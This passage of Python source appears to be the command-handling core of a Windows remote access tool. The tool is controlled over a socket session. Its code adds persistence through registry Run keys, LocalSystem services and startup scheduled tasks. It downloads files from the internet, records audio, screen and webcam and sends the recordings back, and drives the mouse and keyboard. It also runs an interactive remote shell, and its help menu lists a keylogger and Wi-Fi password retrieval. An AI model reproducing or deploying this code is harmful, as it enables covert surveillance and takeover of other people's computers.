                                    device_status=_command_device_status.split('=')[-1], 
                                    mode=4
                                )
                            elif 'bluetooth=' in _command_device_status and (
                            'enable' in _command_device_status or 'disable' in _command_device_status): 
                                device(
                                    device_id='USB', 
                                    usb='BLUETOOTH_ENABLE' if _command_device_status.split('=')[-1] == 'enable' else 'BLUETOOTH_DISABLE', 
                                    device_status=_command_device_status.split('=')[-1], 
                                    mode=4
                                )
                            elif 'printer=' in _command_device_status and (
                            'enable' in _command_device_status or 'disable' in _command_device_status): 
                                device(
                                    device_id='USB', 
                                    usb='PRINTER_ENABLE' if _command_device_status.split('=')[-1] == 'enable' else 'PRINTER_DISABLE', 
                                    device_status=_command_device_status.split('=')[-1], 
                                    mode=4
                                )

                send_msg(session, 'completed') 
                    
                return     
            except AttributeError: ...

        elif 'buffer' in command:
            try:
                search(r'^buffer (-g)', command).group(1).strip()
        
                if buffer_data := buffer_get():
                    send_msg(session, buffer_data)
                else:
                    send_msg(session, 'Buffer is empty')
     
                return
            except AttributeError: ...
            
            try:
                copy_of_data_for_buffer = search(r'^buffer -c (\S?.+)', command).group(1).strip()
                buffer_copy(copy_of_data_for_buffer)
                send_msg(session, 'completed') 

                return
            except AttributeError: ...

            try:
                search(r'^buffer (-r)', command).group(1).strip()
                buffer_copy('')
                send_msg(session, 'completed') 

                return
            except AttributeError: ...

        elif 'app' in command:
            try:
                search(r'^app (-g)', command).group(1).strip()
                send_msg(session, apps())

                return
            except AttributeError: ...

            try:
                try:
                    app_start = search(r'^app -e (?P<name>\S?.+) -p (?P<path>\S?.+) --args (?P<args>\S?.+)', command).groupdict()
                    is_args = True
                except:
                    app_start = search(r'^app -e (?P<name>\S?.+) -p (?P<path>\S?.+)', command).groupdict()
                    is_args = False

                if is_args:
                    args = app_start['args'].strip()
                else:
                    args = 'NULL'
           
                date_startup_app = get_date() 
                app_path = abspath(app_start['path'].strip())

                if not exists(app_start['path'].strip()): 
                    raise FileNotFoundError(f'[Errno 2] No such file or directory: \'{app_start["path"].strip()}\'')
                
                if not exists(rf'{PATH}\config\D566-D7D7-DCD6-471C-8109-BE0A-D331-99E3'):
                    with open(rf'{PATH}\config\D566-D7D7-DCD6-471C-8109-BE0A-D331-99E3', 'w') as startup_apps: ...

                with open(rf'{PATH}\config\D566-D7D7-DCD6-471C-8109-BE0A-D331-99E3', 'r+') as startup_apps:
                    startup_apps_data = startup_apps.read().lower()

                    if (not app_start['name'].strip().lower() in startup_apps_data
                    ) and (not app_path.lower() in startup_apps_data): 
                        startup_apps.write(f'[{date_startup_app[0]}|{date_startup_app[-1]}|' + 
                                           f'{app_start["name"].strip().lower()}|{args}] --> {app_path}\n')

                send_msg(session, 'completed') 
         
                return
            except AttributeError: ...

            try:
                app_start_delete = search(r'^app -e -d (\S?.+)', command).group(1).strip().lower()
                
                startup_data = ''

                with open(rf'{PATH}\config\D566-D7D7-DCD6-471C-8109-BE0A-D331-99E3', 'r') as startup_apps:
                    for _app_start in startup_apps.read().split('\n'):
                        try:
                            if _app_start and (not app_start_delete in _app_start.split('-->')[0].split('|')[-2].strip()):
                                startup_data += f'{_app_start.strip()}\n'
                        except: 
                            continue
                
                with open(rf'{PATH}\config\D566-D7D7-DCD6-471C-8109-BE0A-D331-99E3', 'w') as startup_apps:
                    startup_apps.write(startup_data)
                
                send_msg(session, 'completed') 
          
                return
            except AttributeError: ...

            try:
                try:
                    app_launch = search(r'^app -s (?P<path>\S?.+) --args (?P<args>\S?.+)', command).groupdict()
                    is_args = True
                except: 
                    app_launch = search(r'^app -s (?P<path>\S?.+)', command).groupdict()
                    is_args = False
                
                startfile(app_launch['path'].strip(), arguments=app_launch['args'].strip() if is_args else '', show_cmd=False) 
                send_msg(session, 'completed') 
              
                return
            except AttributeError: ...

            try:
                app_url = search(r'^app -u (?P<url>\S?.+) -n (?P<name>\S?.+)', command).groupdict()
                get_http(app_url['url'].strip(), file=rf'{PATH}\tools\{app_url['name'].strip()}')
                send_msg(session, rf'{PATH}\tools\{app_url['name'].strip()} [+]') 
       
                return
            except AttributeError: ...

            try:
                app_startup = search(r'^app -a (?P<name>\S?.+) -p (?P<path>\S?.+)', command).groupdict()

                try: 
                    regedit(RUN_KEY, None, None, None, 0)
                except: ...

                regedit(RUN_KEY, app_startup['name'].strip(), abspath(app_startup['path'].strip()), 1, 1)
                send_msg(session, rf'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\{app_startup["name"].strip()} | {abspath(app_startup["path"].strip())} [+]') 
                             
                return
            except AttributeError: ... 

            try:
                app_startup = search(r'^app -a (\S?.+)', command).group(1).strip()
                regedit(RUN_KEY, app_startup, None, None, 2)
                send_msg(session, rf'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\{app_startup} [-]') 
                            
                return
            except AttributeError: ...

            try:
                app_service = search(r'^app -t (?P<name>\S?.+) -n (?P<display_name>\S?.+) -p (?P<path>\S?.+) -d (?P<description>\S?.+)', command).groupdict()
                
                for reg_directory in [
                    (r'SYSTEM\CurrentControlSet\Services', None, None, None, 0), 
                    (rf'SYSTEM\CurrentControlSet\Services\{app_service["name"].strip()}', None, None, None, 0)
                ]:
                    try: 
                        regedit(*reg_directory)
                    except: 
                        continue    

                for reg_value in [
                    (rf'SYSTEM\CurrentControlSet\Services\{app_service["name"].strip()}', 'Start', 2, 0, 1), 
                    (rf'SYSTEM\CurrentControlSet\Services\{app_service["name"].strip()}', 'Type', 16, 0, 1), 
                    (rf'SYSTEM\CurrentControlSet\Services\{app_service["name"].strip()}', 'ErrorControl', 1, 0, 1), 
                    (rf'SYSTEM\CurrentControlSet\Services\{app_service["name"].strip()}', 'ObjectName', 'LocalSystem', 1, 1), 
                    (rf'SYSTEM\CurrentControlSet\Services\{app_service["name"].strip()}', 'ImagePath', abspath(app_service['path'].strip()), 2, 1), 
                    (rf'SYSTEM\CurrentControlSet\Services\{app_service["name"].strip()}', 'DisplayName', app_service['display_name'].strip(), 1, 1), 
                    (rf'SYSTEM\CurrentControlSet\Services\{app_service["name"].strip()}', 'Description', app_service['description'].strip(), 1, 1)
                ]:
                    try: 
                        regedit(*reg_value)
                    except: 
                        continue 

                send_msg(
                    session, 
                    rf'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\{app_service["name"].strip()} [+]' + '\n' + 
                    rf'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\{app_service["name"].strip()}\Start [+]' + '\n' + 
                    rf'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\{app_service["name"].strip()}\Type [+]' + '\n' + 
                    rf'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\{app_service["name"].strip()}\ErrorControl [+]' + '\n' + 
                    rf'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\{app_service["name"].strip()}\ObjectName [+]' + '\n' + 
                    rf'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\{app_service["name"].strip()}\ImagePath | {abspath(app_service["path"].strip())} [+]' + '\n' + 
                    rf'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\{app_service["name"].strip()}\DisplayName | {app_service["display_name"].strip()} [+]' + '\n' + 
                    rf'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\{app_service["name"].strip()}\Description | {app_service["description"].strip()} [+]' + '\n' + 
                    'Service created [*]'
                )
         
                return
            except AttributeError: ...

            try:
                app_service = search(r'^app -t (-e|-d) (\S?.+)', command).group(1, 2)
                regedit(rf'SYSTEM\CurrentControlSet\Services\{app_service[1].strip()}', 
                    'Start', 2 if app_service[0].strip() == '-e' else 4, 0, 1)
                run(f'sc {"start" if app_service[0].strip() == "-e" else "stop"} {app_service[1].strip()}'.split(), 
                    stdout=DEVNULL, stderr=DEVNULL, shell=True)
                send_msg(session, 'completed') 
        
                return
            except AttributeError: ...

            try:
                app_service = search(r'^app -t (\S?.+)', command).group(1).strip()
                regedit(r'SYSTEM\CurrentControlSet\Services', app_service, None, None, 3)
                send_msg(session, rf'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\{app_service} [-]') 

                return
            except AttributeError: ...

            try:
                app_task = search(r'^app -n (?P<name>\S?.+) -p (?P<file_path>\S?.+)', command).groupdict()
                run(f'schtasks /create /f /tn "{app_task["name"].strip()}" /tr "{abspath(app_task["file_path"].strip())}" /sc onstart /rl HIGHEST', 
                    stdout=DEVNULL, stderr=DEVNULL, shell=True)
                send_msg(session, rf'C:\Windows\System32\Tasks\{app_task["name"].strip()} | {abspath(app_task["file_path"].strip())} [+]')
                              
                return
            except AttributeError: ...

            try:
                app_task = search(r'^app -n (-e|-d) (\S?.+)', command).group(1, 2)
                run(f'schtasks {"/run" if app_task[0].strip() == "-e" else "/end"} /tn "{app_task[1].strip()}"', 
                    stdout=DEVNULL, stderr=DEVNULL, shell=True)
                send_msg(session, 'completed') 
                   
                return
            except AttributeError: ...

            try:
                app_task = search(r'^app -n (\S?.+)', command).group(1).strip()    
                run(f'schtasks /delete /f /tn "{app_task}"', 
                    stdout=DEVNULL, stderr=DEVNULL, shell=True)
                send_msg(session, rf'C:\Windows\System32\Tasks\{app_task} [-]')
                           
                return
            except AttributeError: ...

            try:
                app_name = search(r'^app (-b|-d) (\S?.+)', command).group(1, 2)
                    
                if app_name[0].strip() == '-b':
                    date_app = get_date()

                    with open(rf'{PATH}\config\1AB5-DB30-65FD-D32A-505A-B6B0-D32E-7VG2', 'r+', encoding='utf-8') as app_requirement:
                        if not app_name[1].strip().lower() in app_requirement.read().lower(): 
                            app_requirement.write(f'[{date_app[0]}|{date_app[-1]}] --> {app_name[1].strip()}\n')
                else:
                    app_data = ''

                    with open(rf'{PATH}\config\1AB5-DB30-65FD-D32A-505A-B6B0-D32E-7VG2', 'r', encoding='utf-8') as app_requirement: 
                        for app in app_requirement.read().split('\n'):
                            try: 
                                if app and app.split()[-2] == '-->' and not app_name[1].strip() in app: 
                                    app_data += f'{app.strip()}\n'
                            except: 
                                continue

                    with open(rf'{PATH}\config\1AB5-DB30-65FD-D32A-505A-B6B0-D32E-7VG2', 'w', encoding='utf-8') as app_requirement: 
                        app_requirement.write(app_data)

                send_msg(session, 'completed') 
                                   
                return
            except AttributeError: ...

            try:
                app_mode = search(r'^app (-l -e|-r -e|-l -b|-r -b)', command).group(1).strip()
                
                if '-e' in app_mode:
                    if app_mode == '-l -e':
                        app_name = []
                        app_args = []
                        app_added_time = [] 
                        path_apps = []

                        with open(rf'{PATH}\config\D566-D7D7-DCD6-471C-8109-BE0A-D331-99E3', 'r') as startup_apps:
                            for _start_app in startup_apps.read().split('\n'):
                                try:
                                    if _start_app:
                                        info_app = (_path_app := _start_app.split('-->'))[0].split('|')

                                        app_name.append(info_app[-2].strip())
                                        app_args.append(info_app[-1].strip()[:-1])
                                        app_added_time.append(f'{info_app[0][1:]} | {info_app[1]}'),
                                        path_apps.append(_path_app[-1].strip())
                                except: 
                                    continue
                        
                        if not app_name and not app_added_time and not path_apps:
                            send_msg(session, 'No bot startup apps')
                        else:
                            send_msg(
                                session, 
                                tabulate(list(zip(app_added_time, app_name, path_apps, app_args)), 
                                    headers=[('DATE'), ('NAME'), ('PATH'), ('ARGUMENTS')], tablefmt='pipe')
                            )
                    else:
                        with open(rf'{PATH}\config\D566-D7D7-DCD6-471C-8109-BE0A-D331-99E3', 'w') as startup_apps: ...
                        
                        send_msg(session, 'completed') 
                else:
                    if app_mode == '-l -b':
                        app_blocked = []
                        app_time_blocked = []

                        with open(rf'{PATH}\config\1AB5-DB30-65FD-D32A-505A-B6B0-D32E-7VG2', 'r+', encoding='utf-8') as app_requirement:
                            for _app in app_requirement.read().split('\n'):
                                try: 
                                    if (app := _app.split())[-2] == '-->': 
                                        app_time_blocked.append(
                                            ' | '.join(app[:-2][0].split('|'))[1:-1] if (not '[NOT' in app and not 'FOUND]' in app
                                            ) else ' | '.join(' '.join(app[:-2])[1:-1].split('|'))
                                        ) 
                                        app_blocked.append(app[-1])
                                except: 
                                    continue
                        
                        if not app_blocked and not app_time_blocked:
                            send_msg(session, 'No blocked apps') 
                        else:
                            send_msg(
                                session, 
                                tabulate(list(zip(app_time_blocked, app_blocked)), 
                                    headers=[('DATE'), ('NAME')], tablefmt='pipe')
                            )  
                    else:
                        with open(rf'{PATH}\config\1AB5-DB30-65FD-D32A-505A-B6B0-D32E-7VG2', 'w', encoding='utf-8') as app_requirement: ...               
                        
                        send_msg(session, 'completed') 
                                                     
                return
            except AttributeError: ...

        elif 'time' in command:
            try:
                search(r'^time (-g)', command).group(1).strip()      
                send_msg(
                    session, 
                    f'Current time: {
                        cmd(run("time /t".split(), 
                            stdout=PIPE,stderr=DEVNULL, shell=True).stdout).strip()
                    }'
                )
                    
                return
            except AttributeError: ...

            try:
                new_time = search(r'^time -c (\S?.+)', command).group(1).strip()
                run(f'time {new_time}'.split(), stdout=DEVNULL, stderr=DEVNULL, shell=True)
                send_msg(session, f'Changed {new_time} [+]') 
                    
                return
            except AttributeError: ... 

        elif 'date' in command:
            try:
                search(r'^date (-g)', command).group(1).strip()
                send_msg(session, 
                    f'Current date: {
                        cmd(run("date /t".split(), 
                            stdout=PIPE, stderr=DEVNULL, shell=True).stdout).strip()
                    }'
                )
                        
                return
            except AttributeError: ...

            try:
                new_date = search(r'^date -c (\S?.+)', command).group(1).strip()
                run(f'date {new_date}'.split(), stdout=DEVNULL, stderr=DEVNULL, shell=True)
                send_msg(session, f'Changed {new_date} [+]') 

                return
            except AttributeError: ...
            
        elif 'play' in command:
            try:
                play_seconds = search(r'^play (-a|-v|-w) -s (\d+)', command).group(1, 2)
                
                match play_seconds[0].strip():
                    case '-a': 
                        play(abs(int(play_seconds[1].strip())), 0)
                        send_msg(session, 'Recording audio completed successfully [+]')  
                    case '-v': 
                        play(abs(int(play_seconds[1].strip())), 1)
                        send_msg(session, 'Recording screen completed successfully [+]') 
                    case _: 
                        play(abs(int(play_seconds[1].strip())), 2)
                        send_msg(session, 'Recording webcam completed successfully [+]')         
   
                return
            except AttributeError: ...

            try:
                play_get = search(r'^play (-a|-v|-w) -g', command).group(1).strip()
                
                match play_get:
                    case '-a':
                        with open(rf'{PATH}\file\V7FB-FAAE-A543-42CE-AF39-CFAC8-449-EE1E.mp3', 'rb') as sound_mp3: 
                            session.sendall(sound_mp3.read()) 
                        
                        clean_folder_file(3)
                    case '-v':
                        with open(rf'{PATH}\file\49AD-4DD3-22FF-170E-F83E-21AF-4EEB-92B5.mp4', 'rb') as screen_recording_mp4: 
                            session.sendall(screen_recording_mp4.read())
                        
                        clean_folder_file(4)
                    case _:
                        with open(rf'{PATH}\file\2328-6639-9EAA-AB39-D099-56B2-9C94-EFEF.mp4', 'rb') as webcam_recording_mp4: 
                            session.sendall(webcam_recording_mp4.read())
                        
                        clean_folder_file(5)

                return
            except AttributeError: ...

            try: 
                play_audio = search(r'^play -a (\S?.+)', command).group(1).strip()
                    
                if isfile(play_audio):
                    if (file_extension := play_audio.split('.')[-1]) in [
                        'mp2', 
                        'mp3', 
                        'ogg', 
                        'wav', 
                        'wma', 
                        'aac'
                    ]: 
                        Thread(target=playsound, args=(play_audio,), name='play_audio').start()
                    else: 
                        raise TypeError(f'Extension is not supported .{file_extension}')
                else: 
                    raise FileNotFoundError(f'[Errno 2] No such file: \'{play_audio}\'')
        
                send_msg(session, 'completed') 

                return
            except AttributeError: ...

        elif 'mouse' in command:
            try: 
                search(r'^mouse (-g)', command).group(1).strip() 
                send_msg(session, 
                    'Current mouse cursor position:' + ' ' + f'{(mouse_position := pygui.position()).x}x{mouse_position.y}')
                    
                return
            except AttributeError: ...

            try:
                mouse_movement = search(r'^mouse -x (?P<x>\d+) -y (?P<y>\d+) -i (?P<interval>\S+)', command).groupdict()   
                pygui.moveTo(abs(int(mouse_movement['x'].strip())), abs(int(mouse_movement['y'].strip())), 
                    duration=abs(float(mouse_movement['interval'].strip())))
                send_msg(session, 'completed')  

                return
            except AttributeError: ...

            try:
                mouse_clicks = search(r'^mouse -c (?P<clicks>\d+) -i (?P<interval>\S+) (?P<button>-l|-r)', command).groupdict()
            
                if mouse_clicks['button'].strip() == '-l':
                    pygui.click(clicks=abs(int(mouse_clicks['clicks'].strip())), 
                        duration=abs(float(mouse_clicks['interval'].strip())))  
                else:
                    pygui.click(clicks=abs(int(mouse_clicks['clicks'].strip())), 
                        duration=abs(float(mouse_clicks['interval'].strip())), button='right')
                
                send_msg(session, 'completed')                  
                   
                return
            except AttributeError: ...

            try:
                mouse_scroll = search(r'^mouse -s (\d+|-\d+)', command).group(1).strip()
                pygui.scroll(int(mouse_scroll))
                send_msg(session, 'completed') 
                   
                return
            except AttributeError: ...

        elif 'keyboard' in command:
            try:
                keyboard_write = search(r'^keyboard -t (?P<text>\S?.+) -i (?P<interval>\S+)', command).groupdict()
                write_on_keyboard(keyboard_write['text'].strip(), delay=abs(float(keyboard_write['interval'].strip())))
                send_msg(session, 'completed') 
                
                return
            except AttributeError: ...

            try:
                keyboard_key = search(r'^keyboard -k (?P<key>\S?.+) -p (?P<presses>\d+) -i (?P<interval>\S+)', command).groupdict()
                pygui.press(keyboard_key['key'].strip(), 
                    presses=abs(int(keyboard_key['presses'].strip())), interval=abs(float(keyboard_key['interval'].strip())))
                send_msg(session, 'completed')
                   
                return
            except AttributeError: ...

            try:
                keyboard_hold_key = search(r'^keyboard -d (?P<key>\S?.+) -s (?P<second>\S+)', command).groupdict()                    
                press_key(keyboard_hold_key['key'].strip())
                sleep(abs(float(keyboard_hold_key['second'].strip())))
                release_key(keyboard_hold_key['key'].strip())
                send_msg(session, 'completed')    
                    
                return
            except AttributeError: ...

            try:
                keyboard_remap_key = search(r'^keyboard -c (?P<key_type>-k|-h) (?P<key_from>\S?.+) -t (?P<key_to>\S?.+)', command).groupdict()
     
                if keyboard_remap_key['key_type'].strip() == '-k':
                    remap_key(keyboard_remap_key['key_from'].strip(), keyboard_remap_key['key_to'].strip()) 
                else:
                    remap_hotkey(keyboard_remap_key['key_from'].strip(), keyboard_remap_key['key_to'].strip())
                
                send_msg(session, 'completed') 
                   
                return
            except AttributeError: ...

            try:
                keyboard_hotkey_or_block_key = search(r'^keyboard (-h|-b) (\S?.+)', command).group(1, 2)
                
                if keyboard_hotkey_or_block_key[0].strip() == '-h':
                    pygui.hotkey(keyboard_hotkey_or_block_key[1].split()) 
                else:
                    block_key(keyboard_hotkey_or_block_key[1].strip())
                
                send_msg(session, 'completed') 
                    
                return
            except AttributeError: ...

            try:
                search(r'^keyboard (-r)', command).group(1).strip()
                unhook_all()
                send_msg(session, 'completed') 
               
                return
            except AttributeError: ...
            
        match command:
            case 'author':
                send_msg(session, 
'''
Hello, welcome to my project
This project was created for remote access to a computer
There are two versions of this project, made through socket and also through a telegram bot
My name is Vladislav Khudash, at the time of the creation of this project I was 17 years old
I love science and sports, let\'s make the world a better place
You can contact me in github https://github.com/cppandpython
'''.strip()
                )
            case 'help':
                send_msg(session, 
'''
Core Commands
=============

    Command                   Description
    -------                   -----------   
    author                    Information about creator of this project                                         
    help                      Help menu
    module                    Module control
    session                   About this session
    accounts                  Control accounts connected to this computer session 
    getuid                    Get the user on whose behalf the bot is running
    getpid                    Get the current process identifier
    exit                      Log out of this computer session
                                                              

File System Commands 
====================

    Command                   Description
    -------                   -----------                                                                                                                                                        
    pwd                       Display working directory
    cd                        Change directory
    ls                        List files in working directory  
    hide                      Hide folder or file
    unhide                    Unhide folder or file                               
    mkdir                     Create folder
    mkfile                    Create file
    rn                        Rename folder or file
    rmdir                     Delete folder            
    rm                        Delete file  
    cp                        Copy folder or file to destination
    mv                        Move folder or file to destination
    download                  Download file
    upload                    Upload file
    encrypt                   Encrypt file
    decrypt                   Decrypt file

                                                              
Networking Commands
===================

    Command                   Description
    -------                   -----------         
    netsh                     Network parameters control
    network                   Network control
    ipconfig                  Get network interfaces
    route                     Get routing table
    arp                       Get host ARP cache                                                                                     
    netstat                   Get network connections
    site                      Website control  
                                                                                               
                                               
System Commands                                                    
===============

    Command                   Description
    -------                   -----------                                                                                                           
    device                    Device control 
    buffer                    Get data from buffer
    systeminfo                Get information about computer
    services                  Get information about services
    tasks                     Get information about tasks
    startup                   Get information about startup
    paths                     Get paths to all folders on computer
    app                       Application control   
    ps                        List running processes
    kill                      Terminate process
    reg                       Registry control
    sc                        Services control
    schtasks                  Task scheduler control
    secedit                   Group policy editor control                     
    wmic                      Control windows with wmic 
    winmgmt                   Wmic tool support              
    user                      User account control on this computer
    time                      Get current time or change current time
    date                      Get current date or change current date
    cmd                       Execute command in cmd
    reboot                    Computer reboot
    shutdown                  Computer shutdown

                                                                                                            
User Interface Commands                                                  
=======================

    Command                   Description
    -------                   -----------
    screenshot                Take screenshot of desktop
    screenshot_webcam         Take screenshot using webcam 
    play                      Record audio or video from screen or video from webcam
    mouse                     Mouse control 
    keyboard                  Keyboard control                                                                                                                                         
    keylogger                 Control collected keylogger data
    show                      Display message
'''.strip()
                )     
            case 'module': 
                send_msg(session, 
'''
Agent module  -  Control the integrity of this program and also blocks malicious actions for this program\n
Keylogger module  -  Control keylogger\n
Blocker app module  -  Control application blocker\n
module -e (all, agent, keylogger, app)  -  Enable module\n
module -d (all, agent, keylogger, app)  -  Disable module\n
module -g  -  Get modules status
'''.strip()
                )       
            case 'session':
                send_msg(session, 'session')       
            case 'accounts':
                send_msg(session, 
'''
accounts -g  -  Get accounts connected to this computer session\n
accounts -d host  -  Delete account connected to this computer session
'''.strip()
                )            
            case 'getuid':
                send_msg(
                    session, 
                    f'Current user: {
                        (current_user := cmd(run("whoami", 
                            stdout=PIPE, stderr=DEVNULL, shell=True).stdout)
                        )[:current_user.rindex("\\")].upper() + current_user[current_user.rindex("\\"):]
                    }'.strip()
                )
            case 'getpid':
                send_msg(session, f'Current pid: {getpid()}')        
            case 'exit': 
                raise StopIteration
            case 'pwd':
                send_msg(session, getcwd()) 
            case 'cd':
                send_msg(session, 'cd path  -  Change current directory')
            case 'ls':
                send_msg(
                    session, 
                    (f'/{"-":-^50}<UNHIDDEN>{"-":-^50}\\\n' + 
                        cmd(run('dir /Q'.split(), 
                            stdout=PIPE, stderr=DEVNULL, shell=True).stdout).strip() + 
                        f'\n/{"-":-^50}<HIDDEN>{"-":-^50}\\\n' + 
                        cmd(run('dir /Q /A:H'.split(), 
                            stdout=PIPE, stderr=DEVNULL, shell=True).stdout).strip()
                    )
                )
            case 'hide':
                send_msg(session, 'hide path  -  Hide folder or file at this path')       
            case 'unhide':
                send_msg(session, 'unhide path  -  Unhide folder or file at this path')        
            case 'mkdir':
                send_msg(session, 'mkdir path  -  Create folder at this path')       
            case 'mkfile':
                send_msg(session, 'mkfile path -c content  -  Create file at this path')      
            case 'rn':
                send_msg(session, 'rn path -t new name  -  Rename folder or file at this path')         
            case 'rmdir':
                send_msg(session, 'rmdir path  -  Delete folder at this path')          
            case 'rm':
                send_msg(session, 'rm path  -  Delete file at this path')        
            case 'cp':
                send_msg(session, 'cp path from -t path to  -  Copy folder or file to this path')         
            case 'mv':
                send_msg(session, 'mv path from -t path to  -  Move folder or file to this path')    
            case 'download':
                send_msg(session, 'download path  -  Download file to this path from remote computer')        
            case 'upload':
                send_msg(session, 'upload path  -  Upload file to this path on remote computer')         
            case 'encrypt':
                send_msg(session, 'encrypt path -p password  -  Encrypt file at this path')     
            case 'decrypt':
                send_msg(session, 'decrypt path -p password  -  Decrypt file at this path')   
            case 'netsh':
                send_msg(session, 'Changing or interacting with netsh')  
            case 'network':
                send_msg(session, 
'''
network -s  -  List detected Wi-Fi\n
network -p  -  List password Wi-Fi\n
network -c  -  Enable Internet\n
network -d  -  Disable Internet
'''.strip()     
                )
            case 'ipconfig':
                send_msg(session, systeminfo(ipconfig=True))        
            case 'route':
                send_msg(session, cmd(run('route PRINT'.split(), 
                    stdout=PIPE, stderr=DEVNULL, shell=True).stdout).strip())         
            case 'arp':
                send_msg(session,cmd(run('arp -a'.split(),
                    stdout=PIPE, stderr=DEVNULL, shell=True).stdout).strip())        
            case 'netstat':
                send_msg(
                    session, 
                    tabulate(
                        _connection_list, 
                        headers=[('PROTOCOL'), ('LOCAL-ADDRESS'), ('LOCAL-PORT'), ('EXTERNAL-ADDRESS'), ('EXTERNAL-PORT'), ('STATE')], 
                        tablefmt='pipe'
                        ) if (_connection_list := findall(r'(TCP|UDP)\s+(\S+)[:](\S+)\s+(\S+)[:](\S+)\s+(\S+)', _netstat := cmd(run(
                            'netstat -a'.split(), stdout=PIPE, stderr=DEVNULL, shell=True).stdout))
                        ) else _netstat.strip()
                )
            case 'site':
                send_msg(session, 
'''
site -s url  -  Open website\n
site -b website name  -  Block website\n
site -d website name  -  Unblock website\n
site -l  -  Get list of blocked websites\n
site -r  -  Unblock all websites
'''.strip()
                )     
            case 'device':
                send_msg(session, 
'''
device -c  -  Create devices data\n
device -r  -  Recovery devices data\n
device -g  -  Get devices log\n
device -l  -  Update devices log\n
device -f node=data, platform=data, platform_version=data, platform_edition=data, product_code=data, motherboard_name=data, motherboard_id=data, bios_name=data, bios_version=data, bios_date=data, cpu=data, cpu_name=data, cpu_id=data, video_card=data, disk=data, monitor=data, sound_device=data, network_adapter=data  -  Change device information\n
device -s disk=enable|disable, video_card=enable|disable, monitor=enable|disable, sound_device=enable|disable, mouse=enable|disable, keyboard=enable|disable, ethernet=enable|disable, wlan=enable|disable, bluetooth=enable|disable, printer=enable|disable  -  Enable or disable device
'''.strip()
                )
            case 'buffer':
                send_msg(session, 
'''
buffer -g  -  Get data from buffer\n
buffer -c data  -  Copy data to buffer\n
buffer -r  -  Clear buffer
'''.strip()
                )
            case 'systeminfo':
                send_msg(session, systeminfo())
            case 'services':
                send_msg(
                    session, 
                    tabulate(
                        services, 
                        headers=[('NAME'), ('DESCRIPTION'), ('STATE')], 
                        tablefmt='pipe'
                    ) if (services := get_services()
                    ) else cmd(run('sc query state= all'.split(), 
                        stdout=PIPE, stderr=DEVNULL, shell=True).stdout).strip()
                )        
            case 'tasks':
                send_msg(
                    session, 
                    tabulate(
                        _task_list, 
                        headers=[('NAME'), ('NEXT-START-TIME'), ('STATE')], 
                        tablefmt='pipe'
                        ) if (
                            _task_list := [_task.replace('"', '').split(',') for _task in cmd(run(
                                'schtasks /query /nh /fo csv'.split(), stdout=PIPE, stderr=DEVNULL, shell=True).stdout).split('\n')]
                        )[0][0] else cmd(
                            run('schtasks /query'.split(), 
                                stdout=PIPE, stderr=DEVNULL, shell=True).stdout).strip()
                ) 
            case 'startup':
                send_msg(
                    session, 
                    tabulate(
                        apps_startup, 
                        headers=[('NAME'), ('COMMAND'), ('LOCATION'), ('USER')], 
                        tablefmt='pipe'
                        ) if (
                            apps_startup := [_startup.split(',')[1:] for _startup in [_startup_.strip() for _startup_ in cmd(
                                run('wmic STARTUP get Caption,Command,Location,User /format:csv'.split(), 
                                    stdout=PIPE, stderr=DEVNULL, shell=True).stdout).split('\n') if _startup_.strip()][1:]]
                        ) else cmd(
                            run('wmic STARTUP get Caption,Command,Location,User /format:table'.split(), 
                                stdout=PIPE, stderr=DEVNULL, shell=True).stdout).strip()
                )        
            case 'paths':
                send_msg(session, get_paths())    
            case 'app': 
                send_msg(session, 
'''
app -g  -  Get name of the installed ones applications\n
app -s file path  -  Run file at this path\n
app -s file path --args arguments  -  Run file at this path with arguments\n
app -e name -p file path  -  Add file to bot startup\n
app -e -d name  -  Delete file from bot startup\n
app -u url -n name  -  Download file from Internet\n
app -a name -p file path  -  Add file to startup\n
app -a name  -  Delete file from startup\n
app -t service name -n display service name -p file path -d service description  -  Create service\n
app -t service name  -  Delete service\n
app -t -e service name  -  Enable service\n
app -t -d service name  -  Disable service\n
app -n task name -p file path  -  Create task\n
app -n task name  -  Delete task\n
app -n -e task name  -  Enable task\n
app -n -d task name  -  Disable task\n
app -b app name  -  Block app\n
app -d app name  -  Unblock app\n
app -l -e  -  Get list of bot startup apps\n
app -r -e  -  Delete all apps when starting bot\n
app -l -b  -  Get list of blocked apps\n
app -r -b  -  Unblock all apps
'''.strip()
                )       
            case 'ps':
                send_msg(
                    session, 
                    tabulate(
                        _process_list, 
                        headers=[('NAME'), ('PID'), ('TYPE'), ('SESSION'), ('MEMORY'), ('STATE'), ('USER'), ('TIME'), ('TITLE')], 
                        tablefmt='pipe'
                    ) if (
                        _process_list := [_process.replace('"', '').split(',') for _process in cmd(run(
                            'tasklist /v /nh /fo csv'.split(), stdout=PIPE, stderr=DEVNULL, shell=True).stdout).split('\n')]
                    )[0][0] else cmd(run(
                        'tasklist /v'.split(), stdout=PIPE, stderr=DEVNULL, shell=True).stdout).strip()
                ) 
            case 'kill':
                send_msg(session, 'kill -p pid  -  Kill process by pid\n\nkill -n name  -  Kill process by name')      
            case 'cmd':
                while True:
                    try:
                        if receive_msg(session) != '__CMD_SESSION__':
                            raise ConnectionRefusedError
                        
                        sleep(0.5)
                        send_msg(session, f'{getcwd()}>')
                        
                        server_cmd_command = receive_msg(session)

                        try:
                            if cd_cmd_path := search(r'^cd (\S?.+)', server_cmd_command).group(1).strip():
                                chdir(cd_cmd_path)
                                continue
                        except: ...

                        match server_cmd_command:
                            case 'exit': 
                                return
                            case 'empty' | 'clear': 
                                continue
                            case _:
                                result_cmd = run(server_cmd_command, stdout=PIPE, stderr=PIPE, input=False, shell=True)

                                stdout = cmd(result_cmd.stdout)
                                stderr = cmd(result_cmd.stderr) 

                                if not stdout and not stderr: 
                                    stdout = f'"{server_cmd_command}" command completed'

                                if not stderr and not stdout: 
                                    stderr = f'"{server_cmd_command}" command completed'  

                                send_msg(session, stdout if stdout else stderr) 
                    except ConnectionError: 
                        raise ConnectionError
                    except: 
